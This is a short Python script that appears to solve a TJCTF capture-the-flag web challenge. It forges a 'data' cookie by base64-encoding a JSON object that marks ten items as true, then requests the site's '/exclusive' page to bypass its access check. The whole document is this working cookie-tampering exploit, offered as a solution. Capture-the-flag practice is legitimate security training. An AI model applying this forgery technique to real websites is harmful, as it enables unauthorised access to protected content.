#!/usr/bin/env python3

import requests
import base64
from urllib.parse import quote

url = "https://sarah_palin_fanpage.tjctf.org/"

data = quote(base64.b64encode(
    '{"1":true,"2":true,"3":true,"4":true,"5":true,"6":true,"7":true,"8":true,"9":true,"10":true}'.encode()))

cookies = {"data" : data}
# print(cookies)
r = requests.get(url + "exclusive", cookies=cookies)

print(r.text)
